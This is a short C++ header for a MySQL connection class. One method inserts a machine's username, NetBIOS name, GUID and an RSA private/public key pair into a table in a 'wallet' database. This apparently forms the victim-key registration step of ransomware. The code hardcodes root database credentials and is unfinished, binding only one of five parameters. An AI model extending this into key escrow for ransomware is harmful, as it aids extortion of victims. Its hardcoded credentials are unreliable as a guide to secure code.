#pragma once

#include <iostream>

#include <cppconn/driver.h>
#include <cppconn\prepared_statement.h>
#include <cppconn\datatype.h>
#include <cppconn\sqlstring.h>

#include "Exhib.h"

using std::cout;
using std::endl;

class ServerCon {
private:
	sql::Driver *driver;
	sql::Connection *con;
public:
	ServerCon() {
		driver = get_driver_instance();
	}
	~ServerCon() {
		delete con;
	}
	bool initConnection() {
		bool guard = false;
		Sentry chk;
		if (chk.chckfnint()) {
			try {
				con = driver->connect("tcp://127.0.0.1:3306", "root", "toor");

				con->setSchema("wallet");
				guard = true;
			}
			catch (sql::SQLException& e) {
				cout << "# ERR: SQLException in " << __FILE__;
				cout << "(" << __FUNCTION__ << ") on line " << __LINE__ << endl;
				cout << "# ERR: " << e.what();
				cout << " (MySQL error code: " << e.getErrorCode();
				cout << ", SQLState: " << e.getSQLState() << " )" << endl;
			}
		}
		else {
			std::cout << "You have no internet access! Please connect to the internet!\n";
			guard = false;
		}
		return guard;
	}
	void fireUp_UN_NBN_GUN_RSAPK(std::string& pcname, std::string& netbios, std::string& guiname,
		std::string& pvtkey, std::string& pubkey) {
		if (initConnection()) {
			try {
				sql::PreparedStatement* prep;
				prep = con->prepareStatement("insert into pacinfos(username, netbios, guid, pvtkey, pubkey) values(?, ?, ?, ?, ?)");
				std::istringstream iss(pcname);
				std::istream& n_pcname(iss);
				prep->setBlob(1, n_pcname);
				prep->execute();
			}
			catch(sql::SQLException& e) {
				cout << "# ERR: SQLException in " << __FILE__;
				cout << "(" << __FUNCTION__ << ") on line " << __LINE__ << endl;
				cout << "# ERR: " << e.what();
				cout << " (MySQL error code: " << e.getErrorCode();
				cout << ", SQLState: " << e.getSQLState() << " )" << endl;
			}
			catch (std::exception& e) {
				std::cout << e.what() << std::endl;
			}
		}
		else {
			std::cout << "Something went bad with connection\n";
		}
	}
};